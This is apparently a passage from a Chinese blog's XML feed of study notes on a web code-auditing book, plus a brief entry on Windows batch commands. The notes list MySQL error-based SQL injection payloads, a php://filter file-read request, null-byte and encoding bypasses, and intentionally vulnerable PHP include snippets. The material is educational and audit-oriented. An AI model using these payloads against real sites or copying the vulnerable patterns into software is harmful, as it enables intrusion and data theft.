class="hljs-keyword">else</span>&#123;<br>    login();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样的写法一般不会出现验证上的安全问题。</p><p>案例是Espcms任意用户登录分析</p><h4 id="6-3-2-漏洞防范"><a href="#6-3-2-漏洞防范" class="headerlink" title="6.3.2 漏洞防范"></a>6.3.2 漏洞防范</h4><p>首先应该了解认证的业务逻辑，限制输入的异常字符以及避免使用客户端提交上来的内容去直接操作。应当把cookie和session结合起来使用，不能从cookie中获取参数值然后操作。在设置session时，需要保证客户端不能操作敏感session参数</p><p>其次是不能把敏感信息存到cookie中</p></li></ol><h2 id="第七章-二次漏洞审计"><a href="#第七章-二次漏洞审计" class="headerlink" title="第七章 二次漏洞审计"></a>第七章 二次漏洞审计</h2><h3 id="7-1-什么是二次漏洞"><a href="#7-1-什么是二次漏洞" class="headerlink" title="7.1 什么是二次漏洞"></a>7.1 什么是二次漏洞</h3><p>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或修改配置触发的漏洞叫做二次漏洞。</p><p>特别经典的SQL注入案例是，攻击者在网站评论的地方发表了带有注入语句的评论，该注入语句被完整的保存到数据库中，但是评论引用刚提交带有注入语句的评论，提交后server端从数据库取材第一次的评论，由于第一次评论中带有单引号可闭合第二次的语句，从而触发了注入漏洞</p><p>出现的原因是开发者在可信数据的逻辑上考虑不全面。</p><h3 id="7-2-二次漏洞审计技巧"><a href="#7-2-二次漏洞审计技巧" class="headerlink" title="7.2 二次漏洞审计技巧"></a>7.2 二次漏洞审计技巧</h3><p>虽然二次漏洞写入payload和触发payload很可能不在同一个地方。但是还是可以通过相关关键字进行定位。但是精度较低了。</p><p>多数的二次漏洞来进行比一般的漏洞强，所以最好是通读全部代码。</p><p>该漏洞经常出现在业务逻辑复杂的地方，如购物车，订单等或和数据库交互的地方。其中可重点关注SQL注入，XSS</p><h2 id="第八章-代码审计小技巧"><a href="#第八章-代码审计小技巧" class="headerlink" title="第八章 代码审计小技巧"></a>第八章 代码审计小技巧</h2><h3 id="8-1-钻GPC等转义的空子"><a href="#8-1-钻GPC等转义的空子" class="headerlink" title="8.1 钻GPC等转义的空子"></a>8.1 钻GPC等转义的空子</h3><p>GPC会自动将我们提交上去的敏感字符转义。但是GPC并不是把所有变量功能，其中$_SERVER变量没有被过滤，且在编码转换中，部分情况下我们能够干掉GPC的转义符号。</p><ol><li><p>不受GPC保护的$_SERVER变量</p><p>在PHP5之后$_SERVER取到的header字段不受GPC影响、$_FILES变量一样不受保护</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GPC&#x27;</span>.get_magic_quotes_gpc();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;client-ip=&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_CLIENT_IP&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;$_GET[a]=&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br></code></pre></div></td></tr></table></figure><p>结果如图：</p><p><img src="https://pic.imgdb.cn/item/60ee8f015132923bf8437195.png"></p></li><li><p>编码转换问题</p><p>在之前介绍的宽字节注入，就是经典的编码转换问题导致绕过GPC的方式。是PHP与MySQL交互过程中发生编码转换导致的问题。</p><p>在PHP自带的编码转换函数上也会存在整个问题，比如mb_convert_encoding()函数</p><p>测试代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;<br>&lt;?php<br>$sql=&quot;where id=&#x27;&quot;.urldecode(&quot;-1%df%5c&#x27; -- &quot;).&quot;&#x27;&quot;;<br>print(mb_convert_encoding($sql,&quot;UTF-8&quot;,&quot;GBK&quot;));<br>?&gt;<br></code></pre></div></td></tr></table></figure><p><em>注意</em>：网页和文件编码都应是UTF-8，这段代码是将UTF-8转换成GBK</p><p>输出结果为：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>/&gt;</span><br>where id=&#x27;-1運&#x27; -- &#x27;<br></code></pre></div></td></tr></table></figure><p>成功闭合了前面的单引号</p></li></ol><h3 id="8-2-神奇的字符串"><a href="#8-2-神奇的字符串" class="headerlink" title="8.2 神奇的字符串"></a>8.2 神奇的字符串</h3><p>由于中文的博大精深，所以可能在语言编码转换时导致各种异常。</p><ol><li><p>字符处理函数报错信息邪路</p><p>页面报错信息通常能泄露文件绝对路径，代码，变量以及函数等信息。对于PHP的报错信息可以进行设置。设置display_errors=on或在代码中加入error_reporting()函数，error_reporting()函数有几个选项来配置显示错误等级</p><p>列表如下：</p><ul><li>E_WARNING</li><li>E_PARSE</li><li>E_NOTICE</li><li>E_CORE_ERROR</li><li>E_CORE_WARNING</li><li>E_USER_ERROR</li><li>E_USER_WARNING</li><li>E_USER_NOTICE</li><li>E_STRICT</li><li>E_RECOVERABLE_ERROR</li><li>EALL</li></ul><p>最常见的是E_ALL、E_WARNING、E_NOTICE。其中E_ALL代表提示所有问题，而E_WARNING代表显示错误信息，E_NOTICE则表示显示基础提示信息</p><p>渗透过程中常常需要绝对路径，所以通过报错界面获取是不错的选择。</p><ol><li>多数程序会使用trim()函数去除首尾空格，此时传入数组则会报错。类似函数还有很多</li></ol></li><li><p>字符串截断</p><ol><li><p>%00空字符截断</p><p>%00即NULL会被GPC和addslashes()函数过滤，且在&gt;PHP5.3之后就被全面修复</p><p>%00在URL解码后为\0，由于PHP基于C语言开发，\0在C语言中是字符串结束符，所以不在读取之后的字符串，所以产生截断</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>同目录下创建文件1.txt，内容是phpinfo()所以请求：?file=1.txt%00就实际上包含了1.txt文件，从而执行了phpinfo代码</p></li><li><p>iconv函数字符编码转换截断</p><p>iconv()函数用来做字符编码转换，但是由于字符集编码存在一定的差异性，所以导致部分编码不能被成功转换。而在iconv()函数转码是，遇到不能处理之后则后续字符串不被处理</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;1&#x27;</span>.chr(<span class="hljs-number">130</span>).<span class="hljs-string">&#x27;2&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UTF-8&quot;</span>,<span class="hljs-string">&quot;gbk&quot;</span>,<span class="hljs-variable">$a</span>);<br></code></pre></div></td></tr></table></figure><p>后面的输出只输出了1</p><p>从chr(130)之后的字符串都没有输出。</p><p>书籍作者fuzz测试后，当文件名有chr(128~255)都可以截断字符</p></li></ol></li></ol><h3 id="8-3-php-输入输出流"><a href="#8-3-php-输入输出流" class="headerlink" title="8.3 php://输入输出流"></a>8.3 php://输入输出流</h3><p>PHP提供了php://协议允许访问PHP的输入输出流，标准输入输出和错误描述符。内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。主要通过如下访问方式来使用这些封装器：</p><ul><li>php://stdin</li><li>php://stdout</li><li>php://stderr</li><li>php://input</li><li>php://output</li><li>php://fd</li><li>php://memory</li><li>php://temp</li><li>php://filter</li></ul><p>使用最多的是php://input，php://output，php://filter</p><ol><li><p>php://input</p><p>可以访问请求的原始数据的只读流。即可直接读取到POST上没有经过解析的原始数据。但是php://input不能再获取“multipart/form-data”方式提交的数据</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>当我们用POST请求提交a=aaa时，a=aaa被直接打印</p></li><li><p>php://output</p><p>是一个只写的数据流，php://output是将流数据输出</p></li><li><p>php://filter</p><p>是一个文件操作的协议，可以对磁盘中的文件进行操作。类似于readfile(),file(),和file_get_contents()。</p><p>有多个参数可以进行相应的操作</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须，指定了要过滤的数据流</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>可选，可以设定一个或多个过滤器名称，以管道符`</td></tr><tr><td>write=&lt;读链的筛选列表&gt;</td><td>可选，可以设定一个或多个过滤器名称，以管道符`</td></tr><tr><td>&lt;;两个链的筛选列表&gt;</td><td>任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">file_put_contents(<span class="hljs-string">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>执行代码后会在同一目录下生成example.txt，并写入rot13编码后的”Hello World”,而php://filter还可以用来读取文件，如果有远程保护文件漏洞，类似如下代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>我们此时想读取文件则使用如下请求即可</p><p>?file=php://filter/convert.base64-encode/resource=1.php</p></li></ol><h3 id="8-4-PHP代码解析标签"><a href="#8-4-PHP代码解析标签" class="headerlink" title="8.4 PHP代码解析标签"></a>8.4 PHP代码解析标签</h3><p>PHP的解析标签有如下几种：</p><ol><li>标准：&lt;?php  ?&gt;</li><li>脚本标签：&lt;script language=”php”&gt; &lt;/script&gt;</li><li>短标签：&lt;? …. ?&gt; 使用短标签前需要在php.ini中设置short_open_taf=on,默认是on状态</li><li>asp标签：&lt;% … %&gt;在PHP3.0.4之后可用，需要在php.ini中设置asp_tags=on,默认是off状态</li></ol><p>主要是为了如果禁止&lt;?php?&gt;的情况</p><h3 id="8-5-fuzz漏洞发现"><a href="#8-5-fuzz漏洞发现" class="headerlink" title="8.5 fuzz漏洞发现"></a>8.5 fuzz漏洞发现</h3><p>fuzz是指对特定目标的模糊测试。例子：使用Office Word打开doc文档时，Word软件会按照指定的格式读取文件的内容，如果文件格式出现异常字符，Word无法解析，而又没有提前捕捉到这种类型的错误就有可能引发Word程序崩溃。</p><p>此时我们就可能通过根据生成大量带有异常格式或字符的doc文档，参数用Word调用从而尝试发现更多的bug。</p><h3 id="8-6-不严谨的正则表达式"><a href="#8-6-不严谨的正则表达式" class="headerlink" title="8.6 不严谨的正则表达式"></a>8.6 不严谨的正则表达式</h3><p>如果正则表达式写的不严谨会导致安全问题产生。</p><p>常见问题有：</p><ol><li><p>没有使用^和$限定匹配开始结束的位置</p><p>举例来说，通过HTTP_CLIENT_IP来获取用户的IP，通过正则查看地址是否合法，不严格的正则表达式写成”\d+\.\d+\.\d+\.\d+”的形式，但是此时最后添加字符串同样也能通过检查</p><p>严谨一点是如下：”\d+\.\d+\.\d+\.\d+$”</p></li><li><p>特殊字符未转义</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$filename</span>=urldecode(<span class="hljs-string">&quot;xxx.php%00jpg&quot;</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/.(jpg|png|gif|bmp)$/i&#x27;</span>,<span class="hljs-variable">$filename</span>))&#123;<br>    file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不允许的文件扩展名&#x27;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>代码显然是没有考虑到特殊的字符转义，没有将<code>.</code>转义，导致此时提交的内容能够成功绕过，形成一个PHP脚本文件。</p></li></ol><h3 id="8-7-十余种MySQL报错注入"><a href="#8-7-十余种MySQL报错注入" class="headerlink" title="8.7 十余种MySQL报错注入"></a>8.7 十余种MySQL报错注入</h3><p>数据库报错注入，通常在没有正常数据回显的SQL注入漏洞中。下面介绍十种报错注入的函数。注意：部分函数不在所有版本通用</p><p>假定查询的sql语句为：</p><p>select * from user where id=?</p><ol><li><p>floor()</p><p>注入语句：</p><p>id=1 and (select 1 from (select count(*),concat(user(),floor (rand(0)*2)) x from information_schema.tables group by x)a)</p></li><li><p>extractvalue()</p><p>注入语句：</p><p>id=1 and (extractvalue(1,concat(0x5c,(select user()))))</p></li><li><p>updatexml()</p><p>注入语句：</p><p>id= 1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</p></li><li><p>GeometryCollection()</p><p>注入语句：</p><p>id= 1 and GeometryCollection((select * from(select * from(select user())a)b))</p></li><li><p>polygon()</p><p>注入语句：</p><p>id= 1 and polygon((select * from(select * from (select user())a)b))</p></li><li><p>multipoint()</p><p>注入语句：</p><p>id=1 and multipoint((select * from(select * form(select user())a)b))</p></li><li><p>multilinestring()</p><p>注入语句：</p><p>id=1 and multilinestring((select * from(select * from(select user())a)b))</p></li><li><p>multipolygon()</p><p>注入语句：</p><p>id=1 and multipolygon((select * from(select * from(select user())a)b))</p></li><li><p>linestring()</p><p>注入语句：</p><p>id=1 and linestring((select * from(select * from(select user())a)b))</p></li><li><p>exp()</p><p>注入语句：</p><p>id=1 and exp(~(select*from(select user())a))</p></li></ol><h3 id="8-8-Windows-FindFirstFile-利用"><a href="#8-8-Windows-FindFirstFile-利用" class="headerlink" title="8.8 Windows FindFirstFile 利用"></a>8.8 Windows FindFirstFile 利用</h3><p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存再数据库里的文件ID读取文件路径。</p><p>这样我们就无法得到我们上传的webshell文件路径。但是再Windows下，我们只需要找到文件所在的目录，然后利用Windows的特性就可以访问到文件。</p><p>因为Windows在搜索文件时使用了FindFirstFile整个winapi函数</p><p>利用方法是将文件名不可知部分之后的部分用<code>&lt;</code>或<code>&gt;</code>代替即可，注意一个表示代替一个字符，使用两个时可以代替多个字符了</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>假定同目录下有1111.txt文件有PHP代码</p><p>使用效果如图</p><p><img src="https://pic.imgdb.cn/item/60eea9d35132923bf8096ded.png"></p><p>通过实践，<code>&lt;&lt;</code>可以使用但是<code>&gt;&gt;</code>报错</p><p>这个特性在多个函数可用，下面列出函数表</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>include()</td><td>包含文件</td></tr><tr><td>include_once()</td><td>包含文件</td></tr><tr><td>require()</td><td>包含文件</td></tr><tr><td>require_once()</td><td>包含文件</td></tr><tr><td>fopen()</td><td>打开文件</td></tr><tr><td>zipparchive::open()</td><td>打开文件</td></tr><tr><td>copy()</td><td>复制文件</td></tr><tr><td>file_get_contents()</td><td>读取文件</td></tr><tr><td>parse_ini_file()</td><td>读取文件</td></tr><tr><td>readfile()</td><td>读取文件</td></tr><tr><td>file_put_contents</td><td>写入文件</td></tr><tr><td>mkdir()</td><td>创建文件夹</td></tr><tr><td>tempnam()</td><td>创建文件</td></tr><tr><td>touch()</td><td>创建文件</td></tr><tr><td>move_uploaded_file()</td><td>移动文件</td></tr><tr><td>opendir()</td><td>文件夹操作</td></tr><tr><td>readdir()</td><td>文件夹操作</td></tr><tr><td>rewinddir()</td><td>文件夹操作</td></tr><tr><td>closedir()</td><td>文件夹操作</td></tr></tbody></table><h3 id="8-9-PHP可变变量"><a href="#8-9-PHP可变变量" class="headerlink" title="8.9 PHP可变变量"></a>8.9 PHP可变变量</h3><p>PHP可变变量是PHP语言的特性使操作更加灵活。</p><p>案例代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 一</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;one&quot;</span>;<br><span class="hljs-variable">$$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$one</span>;<br></code></pre></div></td></tr></table></figure><p>输出为1</p><p>PHP的双引号会解析中间变量</p><p>案例代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;@phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>此时phpinfo()执行成功，其中<code>@</code>是必须存在的，但是除了<code>@</code>还有其他的写法</p><ol><li><p>花括号中第一个字符为空格</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123; phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为TAB</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为注释符</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;/**/phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为回车换行符</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;</span><br><span class="hljs-string">phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为加号<code>+</code></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;+phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为减号<code>-</code></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;-phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>花括号中第一个字符为感叹号<code>!</code></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;$&#123;!phpinfo()&#125;&quot;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>除此之外还有一些如~,\等</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 代码审计：企业级Web代码安全架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bat常用命令</title>
    <link href="/2021/07/13/Windows/bat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/07/13/Windows/bat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h1><p>可能是由于命令直接的执行，所以中间不能有用时较长的命令。在执行hexo命令时，直接使用&amp;&amp;全部在最后一行运行</p><blockquote><p>hexo clean&amp;&amp;hexo g&amp;&amp;hexo d</p></blockquote><h1 id="转化utf-8编码"><a href="#转化utf-8编码" class="headerlink" title="转化utf-8编码"></a>转化utf-8编码</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span><br></code></pre></div></td></tr></table></figure><h1 id="不退出命令框"><a href="#不退出命令框" class="headerlink" title="不退出命令框"></a>不退出命令框</h1><ol><li>cmd /k 暂停后可以继续执行命令</li><li>pause 暂停后任意按键退出</li></ol><h1 id="获取参数"><a href="#获取参数" class="headerlink" title="获取参数"></a>获取参数</h1><ol><li><p>获取从命令行输入参数使用一个%之后跟数字，即命令行参数最多为九个</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 命令行为 *.bat 1 asdf</span><br><span class="hljs-built_in">echo</span> show %2<br></code></pre></div></td></tr></table></figure><p>结果为：</p><blockquote><p>show asdf</p></blockquote></li><li><p>键盘输入参数，用set /p完成</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> /p tmp=请输入:<br><span class="hljs-built_in">echo</span> 输入为%tmp%<br></code></pre></div></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>bat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-漏洞发现与防范-1</title>
    <link href="/2021/07/13/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-1/"/>
    <url>/2021/07/13/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-1/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞发现与防范"><a href="#漏洞发现与防范" class="headerlink" title="漏洞发现与防范"></a>漏洞发现与防范</h1><h2 id="第三章-通用代码审计思路"><a href="#第三章-通用代码审计思路" class="headerlink" title="第三章 通用代码审计思路"></a>第三章 通用代码审计思路</h2><p><em><strong>常见代码审计思路</strong></em></p><ol><li>根据敏感关键字回溯参数传递过程</li><li>查找可控变量，正向追踪变量传递过程</li><li>寻找敏感功能点，通读功能点代码</li><li>直接通读全文代码</li></ol><h3 id="3-1-敏感函数回溯参数过程"><a href="#3-1-敏感函数回溯参数过程" class="headerlink" title="3.1 敏感函数回溯参数过程"></a>3.1 敏感函数回溯参数过程</h3><p>根据敏感函数来逆向追踪参数的传递过程。如HTTP头中的HTTP_CLIENT_IP和HTTP_X_FORWORDFOR等获取到的IP地址，经常没有经过安全过滤就拼接到SQL语句中。</p><p>此处介绍了一个espcms的注入挖掘案例</p><p>大致流程为：</p><ol><li>自动审计，获取可能存在漏洞的代码列表。</li><li>点击可能存在漏洞的代码，进行审计。</li><li>追查变量的获取，再根据获取代码经过的函数构造对应的EXP</li></ol><h3 id="3-2-通读全文代码"><a href="#3-2-通读全文代码" class="headerlink" title="3.2 通读全文代码"></a>3.2 通读全文代码</h3><p>常用于在企业中做安全运营时。</p><p>通读原文代码需要一点的技巧：首先看程序的大体代码结构，主目录文件，模块目录文件，插件目录文件，还需要注意文件大小，创建时间。</p><p>在查看程序目录结构时，我们需要特别注意以下的文件：</p><ol><li><p>函数集文件，通常命名包含functions或者common等关键字，这些文件里面都是一些公共的函数，提供给其他文件统一调用。一般在index.php或者功能性文件的头部就能找到</p></li><li><p>配置文件，通常命名包括config关键字，文件中包括web程序运行必须的功能性配置选项以及数据库等配置信息。从中可以了解程序的小部分功能，另外如果参数值是双引号则可能存在代码执行漏洞。在如下的代码中，我们在修改配置时可以利用PHP可变变量的的特性(不清楚如何利用)</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*配置信息*/</span><br>    <span class="hljs-variable">$siteURL</span>=<span class="hljs-string">&quot;http://*****&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>安全过滤文件，通常命名中有filter、safe、check等关键字，该类文件主要是对于参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</p></li><li><p>index文件，index是一个程序的入口文件。通常来说我们只需要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。其中核心文件有哪些。最好讲核心目录的index文件都简单的读一遍</p></li></ol><p>此处的案例是骑士CMS。暂时大致看一遍，本书看完后尝试自主挖掘。</p><h3 id="3-3-根据功能点定向审计"><a href="#3-3-根据功能点定向审计" class="headerlink" title="3.3 根据功能点定向审计"></a>3.3 根据功能点定向审计</h3><p>根据经验，在以下的几个功能点经常出现漏洞</p><ol><li><p>文件上传功能。如：文章编辑、资料编辑、头像上传、附件上传。该功能最常见的漏洞是任意文件上传。另外还有利用文件名进行SQL注入</p></li><li><p>文件管理功能。如果程序将文件名或者文件路径直接在参数中传递，可能存在任意文件操作的漏洞。利用方法是在路径中使用../或者..\跳转目录。另外还有可能存在XSS漏洞，输出文件名时可能出现</p></li><li><p>登录认证功能。</p><p><strong>注</strong>：登录认证功能不是指一个登录过程，而是整个操作过程中的认证。</p><p>目前的认证方式大多是基于Cookie、Session，大多数程序会将当前登录的用户认证信息放到Cookie。该处漏洞是基于用户信息能够构造对应的Cookie进行登录。</p></li><li><p>找回密码功能。常见利用是验证码的爆破。</p></li></ol><p>案例：BugFree重装漏洞</p><p>在读取是否存在install.lock及action参数是否审计完成和安装完成后，直接利用header跳转程序首页。</p><p>没有使用exit(),die()退出程序，此时继续请求安装界面可以继续安装了。</p><h2 id="第四章-漏洞挖掘与防范-基础篇"><a href="#第四章-漏洞挖掘与防范-基础篇" class="headerlink" title="第四章 